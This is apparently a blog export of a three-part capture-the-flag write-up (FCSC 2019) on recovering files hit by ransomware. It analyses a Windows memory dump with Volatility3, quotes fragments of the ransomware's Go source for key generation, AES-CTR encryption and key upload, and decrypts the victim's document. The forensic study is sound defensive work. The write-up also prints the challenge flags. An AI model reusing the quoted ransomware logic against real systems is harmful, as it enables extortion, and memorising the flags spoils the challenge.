encryption algorithm üìãIn order to decrypt the data file, we‚Äôll need to study the encryption algorithm implemented by this ransomware. Since we have access to the source code, this greatly simplifies the process. ","date":"2023-12-09","objectID":"/fcsc-2019-3615-incident-3/:2:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (3/3)","uri":"/fcsc-2019-3615-incident-3/#1-study-of-the-encryption-algorithm-"},{"categories":["Writeup"],"content":" Zoom on ransomware.go (again, yes)Let‚Äôs go back to the file /cmd/ransomware/ransomware.go, line 223 this time. // Encrypt the file sending the content to temporary file err = file.Encrypt(keys[\"enckey\"], tempFile) if err != nil { cmd.Logger.Println(err) continue } We can see that the Encrypt() encryption function comes from the file file. It seems to take the encryption key and a temporary file name as parameters. It is therefore necessary to analyze what exactly this function does. ","date":"2023-12-09","objectID":"/fcsc-2019-3615-incident-3/:2:1","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (3/3)","uri":"/fcsc-2019-3615-incident-3/#zoom-on-ransomwarego-again-yes"},{"categories":["Writeup"],"content":" Zoom on file.goThe encryption algorithm used by the Encrypt() function can be found in line 21 of the cryptofs/file.go file. func (file *File) Encrypt(enckey string, dst io.Writer) error { [...] // Create a 128 bits cipher.Block for AES-256 block, err := aes.NewCipher([]byte(enckey)) if err != nil { return err } // The IV needs to be unique, but not secure iv := make([]byte, aes.BlockSize) if _, err = io.ReadFull(rand.Reader, iv); err != nil { return err } // Get a stream for encrypt/decrypt in counter mode (best performance I guess) stream := cipher.NewCTR(block, iv) // Write the Initialization Vector (iv) as the first block // of the dst writer dst.Write(iv) [...] } The first part of the code shows the use of the AES-256 encryption algorithm. Encryption is carried out in counter mode (CTR), as can be seen below. The second part of the code tells us that the IV is the first block of the encrypted file. This is good news for us. Since we have the encrypted files and the encryption key, all we need to do to decrypt them is extract the IV from them. ","date":"2023-12-09","objectID":"/fcsc-2019-3615-incident-3/:2:2","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (3/3)","uri":"/fcsc-2019-3615-incident-3/#zoom-on-filego"},{"categories":["Writeup"],"content":" 2. Decrypting the data file üîì","date":"2023-12-09","objectID":"/fcsc-2019-3615-incident-3/:3:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (3/3)","uri":"/fcsc-2019-3615-incident-3/#2-decrypting-the-data-file-"},{"categories":["Writeup"],"content":" IV ExtractionTo extract the IV from data, we can use xxd to get the file contents in hexadecimal and fold to split it into 32-character blocks (remember, the IV is a 32-character hexadecimal string). Then we can use head to keep only the first block, using the -n 1 option. ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ xxd -p data | fold -b32 | head -n 1 b627d24fc90dfe7ce421c43312dc2f2e In this way, we obtain the IV corresponding to our data file : b627d24fc90dfe7ce421c43312dc2f2e ","date":"2023-12-09","objectID":"/fcsc-2019-3615-incident-3/:3:1","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (3/3)","uri":"/fcsc-2019-3615-incident-3/#iv-extraction"},{"categories":["Writeup"],"content":" Decryption with Cyberchef (lazy way)To decrypt our file, we can use Cyberchef. To do this, we need to give it an input (input) the contents of the encrypted file (here data) in hexadecimal. To do this, we can use xxd. Warning Don‚Äôt forget to delete the contents corresponding to the IV of our file, otherwise decryption won‚Äôt work. We use the sed tool to do this. ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ xxd -p -c0 data | sed 's/b627d24fc90dfe7ce421c43312dc2f2e//g' abf961d204bf8c684dff45fc658d5bba4da43a8 [...]7febfd28649595e720a8 *As the result is too large, I will only write the characters corresponding to the beginning and end of the file here. We then need to copy/paste this result into Cyberchef, select the AES Decrypt recipe and enter the following parameters: Key (UTF-8) : 95511870061fb3a2899aa6b2dc9838aa IV (HEX) : b627d24fc90dfe7ce421c43312dc2f2e Mode : CTR Input : HEX Output : RAW We can see that decryption seems to be effective, since we can see the header of a ZIP file 50 4b 03 04 corresponding to PK and other strings such as : _rels/.rels docProps/core.xml docProps/app.xml word/_rels/document.xml.rels word/document.xml [‚Ä¶] These lead us to believe that we are dealing with a Word document. Our file would therefore be the equivalent of flag.docx that we found in the first part of this test. We can then download the file to our machine. Here, we call it flag.zip. We can now unzip it: ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ unzip flag.zip Archive: flag.zip inflating: _rels/.rels inflating: docProps/core.xml inflating: docProps/app.xml inflating: word/_rels/document.xml.rels inflating: word/document.xml inflating: word/styles.xml inflating: word/fontTable.xml inflating: word/settings.xml inflating: [Content_Types].xml The content of a word file is usually found in the word/document.xml document. We can therefore use grep to display the flag directly without having to open it: ‚îå‚îÄ‚îÄ(hashp4„âødragon)-[~/Bureau] ‚îî‚îÄ$ grep \"ECSC{\" word/document.xml [...] \u003c/w:rPr\u003e\u003cw:t\u003eFlag: ECSC{M4ud1t3_C4mp4gn3_2_r4NC0nG1c13L}\u003c/w:t\u003e\u003c/w:r\u003e\u003c/w:p\u003e\u003cw:sectPr\u003e [...] And that‚Äôs it! The decryption is a success. Now let‚Äôs look at another way of doing it. ","date":"2023-12-09","objectID":"/fcsc-2019-3615-incident-3/:3:2","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (3/3)","uri":"/fcsc-2019-3615-incident-3/#decryption-with-cyberchef-lazy-way"},{"categories":["Writeup"],"content":" Decrypting with Python (street credibility++)To decrypt our data file, we can also call on our programming skills (or call on our friend ChatGPT :p). Since we‚Äôre more familiar with Python, we‚Äôll use it to decrypt our file. However, you‚Äôre free to choose another programming language for this exercise. Here‚Äôs the decrypt.py script in question: from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes from cryptography.hazmat.backends import default_backend def decrypt_file(input_file, output_file, key): # Read encrypted content from file with open(input_file, 'rb') as file: encrypted_content = file.read() # Extract IV (first 32 characters) iv = encrypted_content[:16] print(f\"The IV of the file is : {iv.hex()}\") encrypted_data = encrypted_content[16:] # Initialize AES-CTR cipher backend = default_backend() cipher = Cipher(algorithms.AES(key), modes.CTR(iv), backend=backend) decryptor = cipher.decryptor() # Decrypt the content decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize() # Write the decrypted content to the output file with open(output_file, 'wb') as file: file.write(decrypted_data) def main(): input_file = input(\"Enter the path to the encrypted file: \") output_file = input(\"Enter the path for the output file (decrypted content): \") key = input(\"Enter the AES key: \").encode(\"utf-8\") flag = decrypt_file(input_file, output_file, key) print(f\"Decryption completed. Decrypted content saved in '{output_file}'.\") if __name__ == \"__main__\": main() The principle is simple: Ask the user the path to the encrypted file. Ask the user for the path and name of the file in which to store the decrypted content. Ask the user for the decryption key. Then, this script will automatically extract the IV from the encrypted file, display it to the user and finally decrypt its contents. *It would be interesting to modify this script so as to be able to decrypt all files with the extension .encrypted' and name them by their original name (just decode their name in base64‚Äô). Here‚Äôs an example: ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ python3 decrypt.py Enter the path to the encrypted file: data Enter the path for the output file (decrypted content): /tmp/flag Enter the AES key: 95511870061fb3a2899aa6b2dc9838aa The IV of the file is : b627d24fc90dfe7ce421c43312dc2f2e Decryption completed. Decrypted content saved in '/tmp/flag'. We can check the file type using file : ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ file /tmp/flag /tmp/flag: Microsoft Word 2007+ The script works, since the command correctly detects the decrypted file as a Word document. We can now unzip it and use the same grep as before: ‚îå‚îÄ‚îÄ(hashp4„âødragon)-[~/Bureau] ‚îî‚îÄ$ grep \"ECSC{\" /tmp/word/document.xml [...] \u003c/w:rPr\u003e\u003cw:t\u003eFlag: ECSC{M4ud1t3_C4mp4gn3_2_r4NC0nG1c13L}\u003c/w:t\u003e\u003c/w:r\u003e\u003c/w:p\u003e\u003cw:sectPr\u003e [...] We‚Äôve got our flag back. :D ","date":"2023-12-09","objectID":"/fcsc-2019-3615-incident-3/:3:3","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (3/3)","uri":"/fcsc-2019-3615-incident-3/#decrypting-with-python-street-credibility"},{"categories":["Writeup"],"content":" 3. Flag üö©We have therefore succeeded in helping our victim to decrypt his files. The flag for this final challenge is: ECSC{M4ud1t3_C4mp4gn3_2_r4NC0nG1c13L}. This third and final challenge marks the end of the event. I‚Äôd like to thank you for reading my writeups and hope I‚Äôve made my explanations clear enough. Don‚Äôt hesitate to give me your feedback by contacting me directly on Discord or Twitter ;) ","date":"2023-12-09","objectID":"/fcsc-2019-3615-incident-3/:4:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (3/3)","uri":"/fcsc-2019-3615-incident-3/#3-flag-"},{"categories":["Writeup"],"content":" BONUS - Find the flag without the data file üí°Being curious by nature, I wanted to see if it was possible to find the flag directly using the encrypted flag.docx file (ZmxhZy5kb2N4.encrypted) from the memory dump. As a reminder, we had found its virtual address in the dump using the windows.filescan plugin from Volatility3. ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ python3 ~/Tools/volatility3/vol.py -f mem.dmp windows.filescan | grep \"ZmxhZy5kb2N4\" 0xe000123988d0.0\\ZmxhZy5kb2N4.chiffr√© 216 I then recovered the file using the windows.dumpfiles plugin and the --virtaddr option, followed by the virtual address of ZmxhZy5kb2N4.encrypted. ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ python3 vol.py -f mem.dmp windows.dumpfiles --virtaddr 0xe000123988d0 Volatility 3 Framework 2.5.2 Progress: 100.00 PDB scanning finished Cache FileObject FileName Result DataSectionObject 0xe000123988d0 ZmxhZy5kb2N4.chiffr√© file.0xe000123988d0.0xe00010401370.DataSectionObject.ZmxhZy5kb2N4.chiffr√©.dat I then ran my Python script on the encrypted file: ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ python3 decrypt.py Enter the path to the encrypted file: ZmxhZy5kb2N4.chiffr√© Enter the path for the output file (decrypted content): /tmp/flag Enter the AES key: 95511870061fb3a2899aa6b2dc9838aa The IV of the file is : b627d24fc90dfe7ce421c43312dc2f2e Decryption completed. Decrypted content saved in '/tmp/flag'. ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ file /tmp/flag /tmp/flag: Microsoft Word 2007+ As this is indeed considered a Word document, I unzipped it and used grep to extract the flag : ‚îå‚îÄ‚îÄ(hashp4„âødragon)-[~/Bureau] ‚îî‚îÄ$ grep \"ECSC{\" /tmp/word/document.xml [...] \u003c/w:rPr\u003e\u003cw:t\u003eFlag: ECSC{M4ud1t3_C4mp4gn3_2_r4NC0nG1c13L}\u003c/w:t\u003e\u003c/w:r\u003e\u003c/w:p\u003e\u003cw:sectPr\u003e [...] It is therefore possible to solve this last test without relying on the attached data file. ","date":"2023-12-09","objectID":"/fcsc-2019-3615-incident-3/:5:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (3/3)","uri":"/fcsc-2019-3615-incident-3/#bonus---find-the-flag-without-the-data-file-"},{"categories":["Writeup"],"content":"Solution to the **second** challenge in the `3615 Incident` series published at FCSC 2019.","date":"2023-12-08","objectID":"/fcsc-2019-3615-incident-2/","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (2/3)","uri":"/fcsc-2019-3615-incident-2/"},{"categories":["Writeup"],"content":" Introduction üìåThe context remains the same as in the first part. Yet another victim has fallen victim to ransomware. Payment of the ransom is not an option, given the amount involved. So we‚Äôre called in to try and restore the encrypted files. This time, the objective is to find the ransomware‚Äôs encryption key! Note: Answer expected in ECSC{hey.hex()} format. (The challenge is always solved using the mem.dmp.tar.xz file. As a reminder, this is a memory image of the victim‚Äôs computer. In concrete terms, it corresponds to the contents of the volatile memory (RAM) at the time of acquisition, and we‚Äôll see that it proves to be an excellent source of information for digital forensics.) ","date":"2023-12-08","objectID":"/fcsc-2019-3615-incident-2/:1:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (2/3)","uri":"/fcsc-2019-3615-incident-2/#introduction-pushpin"},{"categories":["Writeup"],"content":" 1. Analysis of the ransomware‚Äôs source code üî¨Following our analysis in Part 1, we are fortunate to have the source code for this ransomware. As a reminder, it can be found here: https://github.com/mauri870/ransomware. And that‚Äôs a good thing, because we didn‚Äôt really want to reverse the Go, did we? :D ","date":"2023-12-08","objectID":"/fcsc-2019-3615-incident-2/:2:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (2/3)","uri":"/fcsc-2019-3615-incident-2/#1-analysis-of-the-ransomwares-source-code-"},{"categories":["Writeup"],"content":" Zoom on ransomware.goLet‚Äôs start by finding out how the key is generated. The encryptFile() function in the file cmd/ransomware/ransomware.go, line 112 tells us a bit more. func encryptFiles() { keys := make(map[string]string) [...] // Generate the id and encryption key keys[\"id\"], _ = utils.GenerateRandomANString(32) keys[\"enckey\"], _ = utils.GenerateRandomANString(32) // Persist the key pair on server res, err := Client.AddNewKeyPair(keys[\"id\"], keys[\"enckey\"]) [...] We can see 2 things: The generation of an id using the GenerateRandomANString() function located in the utils file and having the 32 parameter. The generation of enckey using the GenerateRandomANString() function located in the utils file and having 32 as parameter. This id and enckey pair is then sent to a server using the AddNewKeyPair() function in the client file. We can assume that both id and the encryption key enckey (which is surely short for encrypted key) are a randomly generated 32-character string. To be sure, we can study the corresponding function. ","date":"2023-12-08","objectID":"/fcsc-2019-3615-incident-2/:2:1","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (2/3)","uri":"/fcsc-2019-3615-incident-2/#zoom-on-ransomwarego"},{"categories":["Writeup"],"content":" Zoom on utils.goHere, we‚Äôre interested in the GenerateRandomANString() function, on line 13 of utils/utils.go. // Generate a random alphanumeric string with the given size func GenerateRandomANString(size int) (string, error) { key := make([]byte, size) _, err := rand.Read(key) if err != nil { return \"\", err } return hex.EncodeToString(key)[:size], nil } The function is quite simple. It takes an integer as parameter and generates a random string of the same size. This is then encoded in hexadecimal using the function hex.EncodeToString() before being returned. Our hypothesis is therefore confirmed. We‚Äôre looking for a 32-character string, and we know it‚Äôs hexadecimal. But we still have no clue as to how to retrieve this famous key‚Ä¶ ","date":"2023-12-08","objectID":"/fcsc-2019-3615-incident-2/:2:2","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (2/3)","uri":"/fcsc-2019-3615-incident-2/#zoom-on-utilsgo"},{"categories":["Writeup"],"content":" Zoom on client.goLet‚Äôs take a closer look at the AddNewKeyPair() function in client/client.go, line 90. // AddNewKeyPair persist a new keypair on server func (c *Client) AddNewKeyPair(id, encKey string) (*http.Response, error) { payload := fmt.Sprintf(`{\"id\": \"%s\", \"enckey\": \"%s\"}`, id, encKey) return c.SendEncryptedPayload(\"/api/keys/add\", payload, map[string]string{}) } This function takes an id and an enckey encryption key as parameters. It will then format the payload as: { \"id\": \"l'id associ√©\", \"enckey\": \"la cl√© de chiffrement\" } It will then be encrypted and sent to the attacker‚Äôs server via an API through the URI /api/key/add via the function SendEncryptedPayload() (I‚Äôll leave it to you to look at this function in more detail if you‚Äôre interested). So it‚Äôs worth concentrating on sending this payload to find the key. There may still be traces left in the memory dump! Info You may be wondering what the id is for? As a rule, ransomware operators don‚Äôt have just one victim. Each of them has a unique encryption key, and you need to be able to identify them to be able to decrypt the data if the ransom is paid. For this reason, a unique identifier is assigned to each victim and associated with the correct encryption key. However, this only applies if the attacker is willing to decrypt the data. There is absolutely no guarantee that he will keep his end of the bargain‚Ä¶. ","date":"2023-12-08","objectID":"/fcsc-2019-3615-incident-2/:2:3","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (2/3)","uri":"/fcsc-2019-3615-incident-2/#zoom-on-clientgo"},{"categories":["Writeup"],"content":" In a nutshell‚Ä¶Well, it‚Äôs time to summarize our analysis. What we know now: The unique identifier associated with the encryption key is a random sequence of 32 hexadecimal characters. The encryption key is also a random sequence of 32 hexadecimal characters. These are sent to the attacker‚Äôs server via the respective parameters id and enckey, and formatted according to the following model: {\"id\": \"the id\", \"enckey\": \"the key\"}. With this information, we can move on to extracting the encryption key. ","date":"2023-12-08","objectID":"/fcsc-2019-3615-incident-2/:2:4","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (2/3)","uri":"/fcsc-2019-3615-incident-2/#in-a-nutshell"},{"categories":["Writeup"],"content":" 2. Extraction of the encryption key üóùWe need to find the encryption key within the memory dump. To do this, we can use the pattern that sends the payload containing id and enckey to the attacker‚Äôs server. What could be better than grep to find a pattern in a file? :) ","date":"2023-12-08","objectID":"/fcsc-2019-3615-incident-2/:3:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (2/3)","uri":"/fcsc-2019-3615-incident-2/#2-extraction-of-the-encryption-key-"},{"categories":["Writeup"],"content":" grep for the wingrep is a very interesting tool when it comes to repeating patterns within a file. Here, we‚Äôll add several options. The final command is: grep -B 3 -A 3 -wE '{\"id\": \"\\w{32}\", \"enckey\":'. Let‚Äôs take a closer look at these options: The -B 3 option displays 3 lines before the match The -A 3 option displays 3 lines after the match The -wE option allows you to display only results that exactly match the specified pattern, and to activate extended regular expressions. Extended regular expression detail {\"id\":\"\\w{32}\", \"enckey\": : \\w{32}: matches a string of 32 alphanumeric characters (with the _ character added). It‚Äôs the equivalent of [a-zA-Z0-9_]. Now that our grep is ready, we can use it on the memory dump: ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ strings mem.dmp | grep -B 3 -A 3 -wE '{\"id\": \"\\w{32}\", \"enckey\":' \"C:\\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe\" C:\\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe S-1-5-21-2377780471-3200203716-3353778491-1000 {\"id\": \"cd18c00bb476764220d05121867d62de\", \"enckey\": \" cd18c00bb476764220d05121867d62de64e0821c53c7d161099be2188b6cac24cd18c00bb476764220d05121867d62de64e0821c53c7d161099be2188b6cac2495511870061fb3a2899aa6b2dc9838aa422d81e7e1c2aa46aa51405c13fed15b95511870061fb3a2899aa6b2dc9838aa422d81e7e1c2aa46aa51405c13fed15b Encrypting C:\\Users\\Administrateur\\Contacts\\desktop.ini... C:\\Users\\TNKLSA~1\\AppData\\Local\\Temp\\desktop.ini As it turns out, we do have a correspondence! { \"id\": \"cd18c00bb476764220d05121867d62de\", \"enckey\": \"cd18c00bb476764220d05121867d62de64e0821c53c7d161099be2188b6cac24cd18c00bb476764220d05121867d62de64e0821c53c7d161099be2188b6cac2495511870061fb3a2899aa6b2dc9838aa422d81e7e1c2aa46aa51405c13fed15b95511870061fb3a2899aa6b2dc9838aa422d81e7e1c2aa46aa51405c13fed15b Here, the id has the value cd18c00bb476764220d05121867d62de. However, the encryption key is much larger than expected. We therefore need to break it down into 32-character packets. To do this, we manually save the key in a key.txt file. Then we can use the fold utility, with the -b32 option, to split our string: ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ fold -b32 key.txt | sort | uniq 422d81e7e1c2aa46aa51405c13fed15b 64e0821c53c7d161099be2188b6cac24 95511870061fb3a2899aa6b2dc9838aa cd18c00bb476764220d05121867d62de (Using sort and uniq simply removes identical packets of 32). We end up with 4 potential candidates. That said, we notice that the last key is in fact identical to the id! We‚Äôve only got 3 keys left to test ;) ","date":"2023-12-08","objectID":"/fcsc-2019-3615-incident-2/:3:1","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (2/3)","uri":"/fcsc-2019-3615-incident-2/#grep-for-the-win"},{"categories":["Writeup"],"content":" Keys testingUnder real-life conditions, we‚Äôd have to analyze the ransomware code, learn about the encryption algorithm used, dump an encrypted file from the memory image and attempt to decrypt it with each of the potential keys. However, in the context of this writeup, this would be tantamount to giving away the solution to the last stage of this test‚Ä¶ For this reason, and given the small proportion of keys to be evaluated, we need only test them one by one as a flag until the flag is valid. ‚ùå ECSC{422d81e7e1c2aa46aa51405c13fed15b} ‚ùå ECSC{64e0821c53c7d161099be2188b6cac24} ‚úÖ ECSC{95511870061fb3a2899aa6b2dc9838aa} ","date":"2023-12-08","objectID":"/fcsc-2019-3615-incident-2/:3:2","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (2/3)","uri":"/fcsc-2019-3615-incident-2/#keys-testing"},{"categories":["Writeup"],"content":" 3. Flag üö©Thanks to our analysis (and a very liiiiiight bruteforce), we obtain the following flag: ECSC{95511870061fb3a2899aa6b2dc9838aa}. This concludes the second part of the 3615 Incident challenge. Firstly, we were able to see how the encryption key was generated and how it was transmitted to the attacker by studying the ransomware source code. Secondly, we found the key associated with our victim using a pattern search in the memory image. All that‚Äôs left is for you to make a few more efforts to complete the final stage of this challenge ;) ","date":"2023-12-08","objectID":"/fcsc-2019-3615-incident-2/:4:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (2/3)","uri":"/fcsc-2019-3615-incident-2/#3-flag-"},{"categories":["Writeup"],"content":"Solution to the first challenge in the `3615 Incident` series, published at FCSC 2019.","date":"2023-12-07","objectID":"/fcsc-2019-3615-incident-1/","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (1/3)","uri":"/fcsc-2019-3615-incident-1/"},{"categories":["Writeup"],"content":" Introduction üìåYet another victim of ransomware. Payment of the ransom is not an option, given the amount requested. We‚Äôre called in to try and restore the encrypted files. The first part of this challenge requires us to find : the name of the executable file of this ransomware, its Process ID (PID), the SHA1 of the file name flag.docx once encrypted. The expected response format: ECSC{ransomware_name.exe:pid:sha1}. The mem.dmp.tar.xz file is supplied. This is a memory image of the victim‚Äôs computer. In concrete terms, it corresponds to the contents of volatile memory (in other words, RAM) at the time of acquisition, and we‚Äôll see that it proves to be an excellent source of information for digital forensics. ","date":"2023-12-07","objectID":"/fcsc-2019-3615-incident-1/:1:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (1/3)","uri":"/fcsc-2019-3615-incident-1/#introduction-pushpin"},{"categories":["Writeup"],"content":" 1. The search for ransomware üîé","date":"2023-12-07","objectID":"/fcsc-2019-3615-incident-1/:2:0","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (1/3)","uri":"/fcsc-2019-3615-incident-1/#1-the-search-for-ransomware-mag_right"},{"categories":["Writeup"],"content":" Volatility3There are several tools available for analyzing a memory image. For the purposes of this challenge, we‚Äôll be using Volatility3 and grep (more useful than it sounds :p). Volatility3 is an open-source tool for extracting information from a memory dump on a Windows, MacOS or Linux system via plugins. Installation is very quick: git clone https://github.com/volatilityfoundation/volatility3.git cd volatility3 pip3 install -r requirements.txt python3 setup.py build python3 setup.py install Now the tool is ready to use. üòÑ ","date":"2023-12-07","objectID":"/fcsc-2019-3615-incident-1/:2:1","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (1/3)","uri":"/fcsc-2019-3615-incident-1/#volatility3"},{"categories":["Writeup"],"content":" OS IdentificationFirst of all, we need to know which operating system the dump comes from. To do this, we can use grep in the first instance, filtering on terms like Windows, Linux version, and so on. ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ strings mem.dmp | grep \"Windows\" [...] WindowsDirectory Win32API|System Information Functions|GetWindowsDirectory Microsoft Windows 10 Famille|C:\\Windows|\\Device\\Harddisk0\\Partition3 Microsoft Windows 10 Famille icrosoft Windows 10 Famille C:\\Windows\\system32 C:\\Windows Utilisateur Windows [...] Windows Korean (CP 949) Windows Chinese Traditional (CP 950) or Big-5 Windows Central European (CP 1250) Windows Cyrillic (CP 1251) Windows Western European (CP 1252) Windows Greek (CP 1253) Windows Turkish (CP 1254) Windows Hebrew (CP 1255) Windows Arabic (CP 1256) Windows Baltic (CP 1257) Windows Vietnamese (CP 1258) Windows Johab (CP 1361) [...] From the result, it would appear that the memory image comes from a Windows system. To be sure, we can use the windows.info plugin: (-f is the option for specifying the memory dump path.) ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ python3 ~/Tools/volatility3/vol.py -f ~/Bureau/mem.dmp windows.info Volatility 3 Framework 2.5.2 Progress: 100.00 PDB scanning finished Variable Value Kernel Base 0xf801f4077000 DTB 0x1ab000 Symbols file:///home/hashp4/Tools/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/D03C5CF7862E48FE84A06333F1CFA598-1.json.xz Is64Bit True IsPAE False layer_name 0 WindowsIntel32e memory_layer 1 WindowsCrashDump64Layer base_layer 2 FileLayer KdVersionBlock 0xf801f433bdc0 Major/Minor 15.10586 MachineType 34404 KeNumberProcessors 2 SystemTime 2019-05-08 20:04:11 NtSystemRoot C:\\Windows NtProductType NtProductWinNt NtMajorVersion 10 NtMinorVersion 0 PE MajorOperatingSystemVersion 10 PE MinorOperatingSystemVersion 0 PE Machine 34404 PE TimeDateStamp Wed Jan 27 04:38:01 2016 It would therefore appear that the operating system is : a Windows 10 (field NtMajorVersion), 64-bit architecture** (field Is64Bit at true), build 10586 (field Major/Minor). Now that we have this information, we can use the right plugins. ","date":"2023-12-07","objectID":"/fcsc-2019-3615-incident-1/:2:2","series":["3615 Incident"],"tags":["Forensic","FCSC 2019","Volatility","Ransomware"],"title":"[FCSC 2019] - 3615 Incident (1/3)","uri":"/fcsc-2019-3615-incident-1/#os-identification"},{"categories":["Writeup"],"content":" Analyse des processusTo find the name of the ransomware executable file, we can start by listing the processes currently running, using the windows.pstree plugin. It can be used to draw up a tree structure, showing processes and their parent, their process identifier (PID), their creation date, and so on. ‚îå‚îÄ‚îÄ(hashp4„âøkali)-[~/Bureau] ‚îî‚îÄ$ python3 ~/Tools/volatility3/vol.py -f ~/Bureau/mem.dmp windows.pstree Volatility 3 Framework 2.5.2 Progress: 100.00 PDB scanning finished PID PPID ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime ExitTime 4 0 System 0xe0000f65a040 136 - N/A False 2019-05-08 19:57:03.000000 N/A * 256 4 smss.exe 0xe00010e4b040 3 - N/A False 2019-05-08 19:57:03.000000 N/A [...] * 3120 544 userinit.exe 0xe00012034080 0 - 1 False 2019-05-08 19:57:14.000000 2019-05-08 19:57:38.000000 ** 3184 3120 explorer.exe 0xe000116e3080 86 - 1 False 2019-05-08 19:57:14.000000 N/A *** 5444 3184 notepad.exe 0xe00012268100 1 - 1 False 2019-05-08 20:00:29.000000 N/A *** 5496 3184 notepad++.exe 0xe0001214e080 0 - 1 True 2019-05-08 20:00:33.000000 2019-05-08 20:00:41.000000 *** 3080 3184 OneDrive.exe 0xe00012774080 17 - 1 True 2019-05-08 19:57:29.000000 N/A *** 4040 3184 firefox.exe 0xe000125a7840 59 - 1 True 2019-05-08 19:59:06.000000 N/A **** 4896 4040 firefox.exe 0xe000125f7840 9 - 1 True 2019-05-08 19:59:07.000000 N/A **** 4736 4040 firefox.exe 0xe00010385080 20 - 1 True 2019-05-08 19:59:08.000000 N/A **** 3744 4040 firefox.exe 0xe00010347080 19 - 1 True 2019-05-08 19:59:09.000000 N/A **** 1360 4040 firefox.exe 0xe00012155200 19 - 1 True 2019-05-08 19:59:42.000000 N/A **** 3256 4040 firefox.exe 0xe00011196080 22 - 1 True 2019-05-08 19:59:11.000000 N/A **** 5084 4040 firefox.exe 0xe000127446c0 0 - 1 True 2019-05-08 19:59:33.000000 2019-05-08 20:01:04.000000 *** 4812 3184 vmtoolsd.exe 0xe00012620080 10 - 1 False 2019-05-08 19:57:27.000000 N/A *** 5840 3184 MSASCui.exe 0xe00012854840 6 - 1 False 2019-05-08 20:01:01.000000 N/A *** 5208 3184 assistance.exe 0xe000106bb840 9 - 1 True 2019-05-08 20:00:16.000000 N/A **** 5224 5208 conhost.exe 0xe00010335080 2 - 1 False 2019-05-08 20:00:16.000000 N/A *** 5176 3184 notepad++.exe 0xe0001287a840 11 - 1 True 2019-05-08 20:01:49.000000 N/A *** 5596 3184 DumpIt.exe 0xe0001051c840 6 - 1 False 2019-05-08 20:04:09.000000 N/A **** 5364 5596 conhost.exe 0xe0001051b080 4 - 1 False 2019-05-08 20:04:09.000000 N/A (Here, I‚Äôve deliberately removed most of the results for the sake of readability) After analysis, we find several processes that appear legitimate (firefox.exe, notepad.exe, 